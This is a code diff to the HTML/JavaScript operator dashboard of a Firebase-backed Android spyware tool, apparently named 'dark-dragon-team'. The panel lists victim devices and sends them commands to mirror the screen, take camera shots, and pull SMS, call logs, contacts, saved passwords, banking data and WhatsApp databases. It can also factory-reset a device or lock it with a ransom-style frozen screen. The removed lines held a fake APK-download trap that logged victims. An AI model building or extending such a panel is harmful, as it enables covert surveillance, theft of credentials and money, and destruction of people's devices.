@@ -10,7 +10,7 @@
         body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         #login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid var(--neon-red); padding: 40px; text-align: center; background: black; z-index: 10000; box-shadow: 0 0 30px var(--dark-red); }
-        input { background: #110000; border: 1px solid var(--neon-red); color: var(--neon-red); padding: 12px; margin: 10px 0; width: 280px; outline: none; }
+        input, select { background: #110000; border: 1px solid var(--neon-red); color: var(--neon-red); padding: 12px; margin: 10px 0; width: 280px; outline: none; }
         #dashboard { display: none; }
         header { border-bottom: 2px solid var(--neon-red); padding: 15px; text-align: center; background: #110000; box-shadow: 0 5px 15px rgba(255,0,0,0.2); }
         .target-status { background: #1a0000; color: var(--green); padding: 10px; font-size: 13px; border-bottom: 1px solid var(--neon-red); text-align: center; }
@@ -30,7 +30,7 @@
         .btn-special { border-color: var(--purple); color: var(--purple); }
         .btn-cyan { border-color: var(--cyan); color: var(--cyan); }
         .timeline-box { height: 150px; overflow-y: auto; background: #000; border: 1px solid var(--dark-red); padding: 10px; font-size: 10px; color: var(--green); }
-        .live-stream { width: 100%; height: 150px; background: #000; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--cyan); }
+        .live-stream { width: 100%; height: 250px; background: #000; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--cyan); overflow: hidden; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
     </style>
@@ -59,15 +59,14 @@
         <div class="tab" onclick="showTab(event, 'victims-panel')">👥 NODES</div>
         <div class="tab" onclick="showTab(event, 'spy-panel')">👁️ LIVE SPY</div>
         <div class="tab" onclick="showTab(event, 'extract-panel')">📂 DATA/BANK</div>
-        <div class="tab" onclick="showTab(event, 'ghost-panel')">👻 GHOST/VOICE</div>
-        <div class="tab" onclick="showTab(event, 'sys-panel')">💀 SYSTEM</div>
+        <div class="tab" onclick="showTab(event, 'sys-panel')">💀 SYSTEM POWER</div>
     </div>
 
     <div class="container">
         <div id="radar-panel" class="panel active">
             <div class="card">
-                <h3>📊 ACTIVITY TIMELINE (LIVE/OFFLINE)</h3>
-                <div class="timeline-box" id="activity-timeline">Waiting for victim data...</div>
+                <h3>📊 ACTIVITY TIMELINE</h3>
+                <div class="timeline-box" id="activity-timeline">Waiting...</div>
             </div>
             <div class="card">
                 <h3>📍 LIVE TRACER</h3>
@@ -78,37 +77,80 @@
 
         <div id="victims-panel" class="panel">
             <div class="card" style="grid-column: 1 / -1;">
-                <h3>👥 ACTIVE CONNECTIONS</h3>
+                <h3>👥 ACTIVE NODES</h3>
                 <table>
-                    <thead><tr><th>EMAIL/ID</th><th>DEVICE</th><th>GENDER</th><th>STATUS</th><th>ACTION</th></tr></thead>
+                    <thead><tr><th>TARGET</th><th>DEVICE</th><th>GENDER</th><th>STATUS</th><th>ACTION</th></tr></thead>
                     <tbody id="victim-list"></tbody>
                 </table>
             </div>
         </div>
 
         <div id="spy-panel" class="panel">
-            <div class="card">
-                <h3>📸 LIVE CAMERA</h3>
-                <div class="live-stream" id="camera-viewer">READY</div>
-                <div style="margin-top:10px; display:flex; gap:5px;">
-                    <button onclick="sendCommand('cam_front')">FRONT</button>
-                    <button onclick="sendCommand('cam_back')">BACK</button>
-                    <button class="btn-cyan" onclick="sendCommand('screen_mirror')">MIRROR SCREEN</button>
+            <div class="card" style="grid-column: 1 / -1;">
+                <h3>📺 REMOTE MONITOR (SCREEN MIRROR)</h3>
+                <div class="live-stream" id="screen-viewer">
+                    <img id="live-screen-img" style="width:100%; height:auto; display:none;">
+                    <span id="screen-status">SCREEN OFFLINE</span>
+                </div>
+                <div style="margin-top:10px; display:flex; gap:10px;">
+                    <button class="btn-cyan" onclick="sendCommand('start_screen_mirror')">START MIRROR</button>
+                    <button class="btn-danger" onclick="sendCommand('stop_screen_mirror')">STOP MIRROR</button>
+                    <button onclick="sendCommand('take_screenshot')">CAPTURE NOW</button>
                 </div>
             </div>
+            <div class="card">
+                <h3>📸 CAMERA SPY</h3>
+                <button onclick="sendCommand('cam_front')">FRONT SHOT</button>
+                <button onclick="sendCommand('cam_back')">BACK SHOT</button>
+            </div>
         </div>
+
+        <div id="extract-panel" class="panel">
+            <div class="card">
+                <h3>📂 LOGS & HISTORY</h3>
+                <button onclick="sendCommand('get_sms')">SMS LOGS</button>
+                <button onclick="sendCommand('get_call_logs')">CALL LOGS</button>
+                <button onclick="sendCommand('get_contacts')">CONTACTS</button>
+                <button class="btn-special" onclick="sendCommand('get_passwords')">SAVED PASSWORDS</button>
+            </div>
+            <div class="card">
+                <h3>💳 SENSITIVE DATA</h3>
+                <button class="btn-special" onclick="sendCommand('get_bank_data')">BANKING INFO</button>
+                <button onclick="sendCommand('get_whatsapp')">WHATSAPP DB</button>
+            </div>
         </div>
+
+        <div id="sys-panel" class="panel">
+            <div class="card">
+                <h3>🔋 DEVICE CONTROL</h3>
+                <button class="btn-danger" onclick="sendCommand('device_off')">SHUTDOWN DEVICE</button>
+                <button class="btn-danger" onclick="sendCommand('device_restart')">RESTART DEVICE</button>
+                <button class="btn-danger" onclick="sendCommand('device_reset')">FACTORY RESET</button>
+            </div>
+            <div class="card">
+                <h3>🔐 SECURITY LOCK</h3>
+                <input type="text" id="lock-pass" placeholder="ENTER NEW PASSWORD" style="width:90%;">
+                <button class="btn-special" style="width:100%;" onclick="sendCustomLock()">LOCK WITH PASSWORD</button>
+            </div>
+            <div class="card">
+                <h3>☣️ VIRUS / GLITCH MODE</h3>
+                <button class="btn-danger" style="width:100%; padding:20px; font-size:14px;" onclick="sendCommand('nuclear_lockdown')">
+                    ☢️ NUCLEAR LOCKDOWN (ANONYMOUS LOGO)
+                </button>
+                <p style="font-size:10px; color:gray; margin-top:10px;">* This will freeze the device with "YOU HACKED NOW" screen. User cannot go back or turn off.</p>
+            </div>
+        </div>
+
+    </div>
 </div>
 
 <script>
-    // --- 1. INITIALIZE FIREBASE (ONLY ONCE) ---
+    // --- 1. FIREBASE SETUP ---
     const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // --- 2. AUTHENTICATION (FIXED) ---
+    // --- 2. AUTH ---
     const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ=="; 
     const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA=="; 
 
@@ -122,7 +164,7 @@
         } else { alert("ACCESS DENIED!"); }
     }
 
-    // --- 3. MASTER FUNCTIONS ---
+    // --- 3. CORE LOGIC ---
     function initApp() {
         loadVictims();
         setInterval(draw, 50);
@@ -134,14 +176,13 @@
             list.innerHTML = "";
             snap.forEach((child) => {
                 const v = child.val();
-                const genderIcon = v.gender === 'girl' ? '👧' : '👦';
                 const status = v.online ? '<span style="color:var(--green)">ONLINE</span>' : '<span style="color:gray">OFFLINE</span>';
                 list.innerHTML += `<tr>
-                    <td>${v.email || v.target || "Unknown"}</td>
+                    <td>${v.target || "Unknown"}</td>
                     <td>${v.device || "N/A"}</td>
-                    <td>${genderIcon}</td>
+                    <td>${v.gender || "---"}</td>
                     <td>${status}</td>
-                    <td><button onclick="selectTarget('${child.key}', '${v.target || 'N/A'}', '${v.gender || 'N/A'}')">SELECT</button></td>
+                    <td><button onclick="selectTarget('${child.key}', '${v.target}', '${v.gender}')">SELECT</button></td>
                 </tr>`;
             });
         });
@@ -151,39 +192,38 @@
     function selectTarget(key, name, gender) {
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
-        document.getElementById('gender-display').innerText = gender.toUpperCase();
+        document.getElementById('gender-display').innerText = (gender || "---").toUpperCase();
         document.getElementById('deselect-btn').style.display = "inline-block";
-        loadActivity(key);
+        
+        // සූදානම් වෙන්න Screen ඇක්සස් වලට
+        db.ref('screens/' + key).on('value', (snap) => {
+            const data = snap.val();
+            if(data && data.img) {
+                document.getElementById('live-screen-img').src = data.img;
+                document.getElementById('live-screen-img').style.display = "block";
+                document.getElementById('screen-status').style.display = "none";
+            }
+        });
     }
 
     function deselectTarget() {
         window.activeTarget = null;
         document.getElementById('active-target-display').innerText = "NONE";
-        document.getElementById('gender-display').innerText = "---";
         document.getElementById('deselect-btn').style.display = "none";
-    }
-
-    function loadActivity(targetId) {
-        db.ref('activity/' + targetId).limitToLast(15).on('value', (snap) => {
-            const box = document.getElementById('activity-timeline');
-            box.innerHTML = "";
-            snap.forEach(child => {
-                const act = child.val();
-                box.innerHTML = `<div>[${act.time}] ${act.event}</div>` + box.innerHTML;
-            });
-        });
     }
 
     function sendCommand(cmd) {
         if(!window.activeTarget) return alert("SELECT A TARGET FIRST!");
-        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now(), mode: 'online' });
-        alert("Command Sent: " + cmd);
+        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
+        alert("Dragon Command Sent: " + cmd);
     }
 
-    function sendSmsCommand(cmd) {
-        if(!window.activeTarget) return alert("SELECT A TARGET!");
-        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now(), mode: 'sms_relay' });
-        alert("SMS Command Relayed: " + cmd);
+    function sendCustomLock() {
+        const pass = document.getElementById('lock-pass').value;
+        if(!pass) return alert("Enter a password!");
+        if(!window.activeTarget) return alert("Select Target!");
+        db.ref('commands/' + window.activeTarget).set({ action: 'custom_lock', password: pass, time: Date.now() });
+        alert("Device will lock with: " + pass);
     }
 
     function showTab(evt, id) {
@@ -193,31 +233,7 @@
         evt.currentTarget.classList.add('active');
     }
 
-    // --- 4. SITE VISITOR LOGGING & TRAP (NEW) ---
-    window.addEventListener('load', async () => {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const info = await res.json();
-            db.ref('site_visitors').push({
-                ip: info.ip, city: info.city, device: navigator.platform, 
-                time: new Date().toLocaleString(), status: "Browsing"
-            });
-        } catch(e) {}
-    });
-
-    async function handleDownload(appName, mediafireUrl) {
-        const logRef = db.ref('victims').push();
-        await logRef.set({
-            target: appName,
-            device: navigator.platform,
-            agent: navigator.userAgent,
-            time: new Date().toLocaleString(),
-            status: "DOWNLOADING_APK"
-        });
-        setTimeout(() => { window.location.href = mediafireUrl; }, 1000);
-    }
-
-    // --- 5. MATRIX ANIMATION ---
+    // Matrix Background
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
